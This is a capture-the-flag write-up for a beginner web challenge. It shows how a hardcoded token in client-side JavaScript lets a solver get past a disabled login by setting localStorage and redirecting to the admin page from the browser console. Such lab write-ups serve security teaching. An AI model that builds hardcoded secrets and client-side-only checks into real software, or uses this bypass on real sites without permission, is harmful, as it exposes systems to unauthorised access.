# Alien Access Overwrite

Category: web

## Challenge Difficulty

very easy

## Challenge Description
The alien attackers have compromised the Nova Sentinel's main control panel web interface. As a cybersecurity specialist, you need to find vulnerabilities in the control panel and gain administrative access to restore control of the ship's systems. You've managed to access a backup copy of the control panel's login page. Your task is to bypass the authentication and gain access to the admin panel where you can restore the ship's defense systems.

## Solution

- We initially tried to log in with a random account "test" "test"
- It just prompts us this message

- We then proceed to inspect the code

    const SECRET_TOKEN = 'ALIEN_ACCESS_GRANTED_42';

This declares a constant string variable, likely used as a fake access token. Hardcoded, meaning anyone who reads the source can see it.

    document.getElementById('loginForm').addEventListener('submit', function (e) {
        e.preventDefault();
        alert('Login disabled.');
    });

This disables the login form. Even if you try to submit the form, it will just alert "Login disabled." and do nothing. So, you canâ€™t log in using normal means.

    function accessAdminPanel() {
    localStorage.setItem('accessToken', SECRET_TOKEN);
    window.location.href = "admin_panel.html?access=granted";
    }
- Stores the secret token into localStorage as accessToken.
- Redirects the browser to admin_panel.html?access=granted.

- We then go into console and run the script to access admin panel:
  
      localStorage.setItem('accessToken', 'ALIEN_ACCESS_GRANTED_42');
      window.location.href = "admin_panel.html?access=granted";

- After running the script it leads us to this page

- We then proceed to click the restore the "Restore All Systems" button
- Which then prompts us this

- Flag is then revealed
